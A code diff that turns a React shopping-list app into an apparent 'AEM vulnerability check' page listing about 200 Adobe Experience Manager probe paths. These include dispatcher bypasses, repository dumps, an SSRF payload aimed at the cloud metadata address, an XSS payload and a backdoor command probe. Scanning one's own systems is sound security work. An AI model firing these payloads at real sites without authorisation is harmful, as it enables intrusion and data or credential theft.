@@ -1,74 +1,221 @@
 import React from 'react';
-import Form from './Form';
 import ListItem from './ListItem';
-import {connect} from 'react-redux';
-class App extends React.Component{
-    state = {
-        articles: []
-    };
 
-    // addArticle = (article) => {
-    //     let oldrticles=this.state.articles;
-    //     article.id=Date.now();
-    //     let newArticles=[...oldrticles, article];
-    //     this.setState({articles:newArticles});
-    // };
-    addArticle = (article) => {
-        this.props.addArticle(article);
-    } ;
+const items = [
+{ path: "/system/sling.jsp"},
+{ path: "/system/sling/info.sessionInfo.json"},
+{ path: "/system/sling/info.sessionInfo.txt"},
+{ path: "/jcr:content.json"},
+{ path: "/.json"},
+{ path: "/.1.json"},
+{ path: "/.infinity.json"},
+{ path: "/.xml"},
+{ path: "/.1.xml"},
+{ path: "/.feed.xml"},
+{ path: "/content.json"},
+{ path: "/content.1.json"},
+{ path: "/content.infinity.json"},
+{ path: "/content.xml"},
+{ path: "/content.1.xml"},
+{ path: "/content.feed.xml"},
+{ path: "/apps.json"},
+{ path: "/apps.1.json"},
+{ path: "/apps.infinity.json"},
+{ path: "/apps.xml"},
+{ path: "/apps.1.xml"},
+{ path: "/apps.feed.xml"},
+{ path: "/bin.json"},
+{ path: "/bin.1.json"},
+{ path: "/bin.infinity.json"},
+{ path: "/bin.xml"},
+{ path: "/bin.1.xml"},
+{ path: "/bin.feed.xml"},
+{ path: "/etc.json"},
+{ path: "/etc.1.json"},
+{ path: "etc.infinity.json"},
+{ path: "/etc.xml"},
+{ path: "/etc.1.xml"},
+{ path: "/etc.feed.xml"},
+{ path: "/home.json"},
+{ path: "/home.1.json"},
+{ path: "/home.infinity.json"},
+{ path: "/home.xml"},
+{ path: "/home.1.xml"},
+{ path: "/home.feed.xml"},
+{ path: "/libs.json"},
+{ path: "/libs.1.json"},
+{ path: "/libs.infinity.json"},
+{ path: "/libs.xml"},
+{ path: "/libs.1.xml"},
+{ path: "/libs.feed.xml"},
+{ path: "/var.json"},
+{ path: "/var.1.json"},
+{ path: "/var.infinity.json"},
+{ path: "/var.xml"},
+{ path: "/var.1.xml"},
+{ path: "/var.feed.xml"},
+{ path: "/var/classes.json"},
+{ path: "/var/classes.1.json"},
+{ path: "/var/classes.infinity.json"},
+{ path: "/var/classes.xml"},
+{ path: "/var/classes.1.xml"},
+{ path: "/var/classes.feed.xml"},
+{ path: "/bin/querybuilder.json"},
+{ path: "/system/console"},
+{ path: "/system/console/configMgr"},
+{ path: "/system/admin"},
+{ path: "/system/sling/cqform/defaultlogin.html"},
+{ path: "/crx/de/index.jsp"},
+{ path: "/crx/"},
+{ path: "/etc/packages"},
+{ path: "/etc/replication"},
+{ path: "/etc/cloudservices"},
+{ path: "/content/geometrixx"},
+{ path: "/content/geometrixx-outdoors/en.html"},
+{ path: "/libs/cq/core/content/login.html"},
+{ path: "/libs/cq/core/content/welcome.html"},
+{ path: "/bin/querybuilder.json/a.css"},
+{ path: "/bin/querybuilder.json/a.html"},
+{ path: "/bin/querybuilder.json/a.ico"},
+{ path: "/bin/querybuilder.json/a.png"},
+{ path: "/bin/querybuilder.json;%0aa.css"},
+{ path: "/bin/querybuilder.json/a.1.json"},
+{ path: "/system/sling/loginstatus.json"},
+{ path: "/system/sling/loginstatus.css"},
+{ path: "/system/sling/loginstatus.png"},
+{ path: "/system/sling/loginstatus.gif"},
+{ path: "/system/sling/loginstatus.html"},
+{ path: "/system/sling/loginstatus.json/a.1.json"},
+{ path: "/system/sling/loginstatus.json;%0aa.css"},
+{ path: "/system/bgservlets/test.json"},
+{ path: "/system/bgservlets/test.css"},
+{ path: "/system/bgservlets/test.png"},
+{ path: "/system/bgservlets/test.gif"},
+{ path: "/system/bgservlets/test.html"},
+{ path: "/system/bgservlets/test.json/a.1.json"},
+{ path: "/system/bgservlets/test.json;%0aa.css"},
+{ path: "///bin///querybuilder.json"},
+{ path: "///bin///querybuilder.json.servlet"},
+{ path: "///bin///querybuilder.json/a.css"},
+{ path: "///bin///querybuilder.json.servlet/a.css"},
+{ path: "///bin///querybuilder.json/a.ico"},
+{ path: "///bin///querybuilder.json.servlet/a.ico"},
+{ path: "///bin///querybuilder.json;%0aa.css"},
+{ path: "///bin///querybuilder.json.servlet;%0aa.css"},
+{ path: "///bin///querybuilder.json/a.1.json"},
+{ path: "///bin///querybuilder.json.servlet/a.1.json"},
+{ path: "///bin///querybuilder.json.css"},
+{ path: "///bin///querybuilder.json.ico"},
+{ path: "///bin///querybuilder.json.html"},
+{ path: "///bin///querybuilder.json.png"},
+{ path: "///bin///querybuilder.feed.servlet"},
+{ path: "///bin///querybuilder.feed.servlet/a.css"},
+{ path: "///bin///querybuilder.feed.servlet/a.ico"},
+{ path: "///bin///querybuilder.feed.servlet;%0aa.css"},
+{ path: "///bin///querybuilder.feed.servlet/a.1.json"},
+{ path: "///bin///wcm/search/gql.servlet.json"},
+{ path: "///bin///wcm/search/gql.json"},
+{ path: "///bin///wcm/search/gql.json/a.1.json"},
+{ path: "///bin///wcm/search/gql.json;%0aa.css"},
+{ path: "///bin///wcm/search/gql.json/a.css"},
+{ path: "///bin///wcm/search/gql.json/a.ico"},
+{ path: "///bin///wcm/search/gql.json/a.png"},
+{ path: "///bin///wcm/search/gql.json/a.html"},
+{ path: "///system///sling/loginstatus.json"},
+{ path: "///system///sling/loginstatus.json/a.css"},
+{ path: "///system///sling/loginstatus.json/a.ico"},
+{ path: "////system///sling/loginstatus.json;%0aa.css"},
+{ path: "///system///sling/loginstatus.json/a.1.json"},
+{ path: "///system///sling/loginstatus.css"},
+{ path: "///system///sling/loginstatus.ico"},
+{ path: "///system///sling/loginstatus.png"},
+{ path: "///system///sling/loginstatus.html"},
+{ path: "/libs/cq/contentinsight/content/proxy.reportingservices.json"},
+{ path: "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet"},
+{ path: "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url=http://169.254.169.254%23/api1.omniture.com/a&q=a"},
+{ path: "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet"},
+{ path: "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json"},
+{ path: "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json;%0aa.css?datacenter=https://site%23&company=xxx&username=zzz&secret=yyyy"},
+{ path: "/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json"},
+{ path: "/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json"},
+{ path: "/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json/a.css"},
+{ path: "/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json/a.html"},
+{ path: "/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json/a.ico"},
+{ path: "/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json/a.png"},
+{ path: "/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json/a.gif"},
+{ path: "/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json/a.1.json"},
+{ path: "/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json;%0aa.css"},
+{ path: "/bin/wcm/contentfinder/connector/suggestions.json/a.html?query_term=path%3a/&pre=%3Csvg+onload%3dalert(document.domain)%3E&post=yyyy"},
+{ path: "/.ext.infinity.json"},
+{ path: "/.ext.infinity.json?tidy=true"},
+{ path: "/bin/querybuilder.json?type=nt:base&p.limit=-1"},
+{ path: "/bin/wcm/search/gql.servlet.json?query=type:base%20limit:..-1&pathPrefix="},
+{ path: "/content.assetsearch.json?query=*&start=0&limit=10&random=123"},
+{ path: "/..assetsearch.json?query=*&start=0&limit=10&random=123"},
+{ path: "/system/bgservlets/test.json?cycles=999999&interval=0&flushEvery=111111111"},
+{ path: "/content.ext.infinity.1..json?tidy=true"},
+{ path: "/libs/dam/cloud/proxy.json"},
+{ path: "/crx/repository/test"},
+{ path: "/.json"},
+{ path: "/.1.json"},
+{ path: "/.childrenlist.json"},
+{ path: "/.ext.json"},
+{ path: "/.4.2.1...json"},
+{ path: "/.json/a.css"},
+{ path: "/.json/a.html"},
+{ path: "/.json/a.png"},
+{ path: "/.json/a.ico"},
+{ path: "/.json;%0aa.css"},
+{ path: "/content.json"},
+{ path: "/content.1.json"},
+{ path: "/content.childrenlist.json"},
+{ path: "/content.ext.json"},
+{ path: "/content.4.2.1...json"},
+{ path: "/content.json/a.css"},
+{ path: "/content.json/a.html"},
+{ path: "/content.json/a.png"},
+{ path: "/content.json/a.ico"},
+{ path: "/content.json;%0aa.css"},
+{ path: "/bin.json"},
+{ path: "/bin.1.json"},
+{ path: "/bin.childrenlist.json"},
+{ path: "/bin.ext.json"},
+{ path: "/bin.4.2.1...json"},
+{ path: "/bin.json/a.css"},
+{ path: "/bin.json/a.html"},
+{ path: "/bin.json/a.png"},
+{ path: "/bin.json/a.ico"},
+{ path: "/bin.json;%0aa.css"},
+{ path: "/content/usergenerated/etc/commerce/smartlists"},
+{ path: "/etc.childrenlist.json"},
+{ path: "/etc/cloudsettings.-1.json"},
+{ path: "/bin/backdoor.html?cmd=ifconfig"},
+{ path: "/libs/mcm/salesforce/customer.json"},
+{ path: "/libs/opensocial/proxy?.css"},
+{ path: "/etc/mobile/useragent-test.html"},
+{ path: "/etc/reports/diskusage.html"},
+{ path: "/system/console?.css"},
+{ path: "/bin/querybuilder.feed.servlet/a.html"},
+{ path: "/bin/querybuilder.json.servlet/a.html"},
+{ path: "/etc.json/a.html"},
+{ path: "///etc.json/a.html"},
+{ path: "/crx/de/index.jsp;%0aa.html"},
+{ path: "///bin///querybuilder.feed.html"},
+{ path: "/bin/querybuilder.feed.html"},
+{ path: "/bin/querybuilder.json.html"}
+];
+class App extends React.Component {
+  render() {
+    return (
+      <div className="card">
+        <header className="App-header">
+          <h1 className="card-header">AEM Vunability Check</h1>
+        </header>
 
-    render(){
-        return(
-
-
-            <div className="alert alert-info">
-                <h3>List des courses </h3>
-                < Form className="alert alert-info" formTitle=' Ajouter Article' addArticle={this.props.addArticle}/>
-                < ListItem className="alert alert-warning"  articles={this.props.articles} editArticle ={this.props.editArticle} deleteArticle ={this.props.deleteArticle} />
-                </div>
-
-        );
-    }
-    
+        <ListItem items={items} />
+      </div>
+    );
+  }
 }
 
-const addArticleActionCreator = (article) => {
-    return {
-        type : 'ADD_ARTICLE' ,
-         payload: article
-    }
-};
-const editArticleActionCreator = (article) => {
-    return {
-        type : 'EDIT_ARTICLE' ,
-        payload: article
-    }
-};
-const deleteArticleActionCreator = (article) => {
-    return {
-        type : 'DELETE_ARTICLE' ,
-        payload: article
-    }
-}
-
-const mapStateToProps= (state) => {
-    return {
-        articles: state.articles
-    }
-}
-const mapDispatchToProps = (dispatch) => {
-    return {
-        addArticle: (article)  => {
-            dispatch(addArticleActionCreator(article));
-        },
-        editArticle: (article)  => {
-            dispatch(editArticleActionCreator(article));
-        },
-        
-        deleteArticle: (article)  => {
-            dispatch(deleteArticleActionCreator(article));
-        }
-    }
-}
-//export default App;
-export default connect(mapStateToProps,mapDispatchToProps)(App);
+export default App;
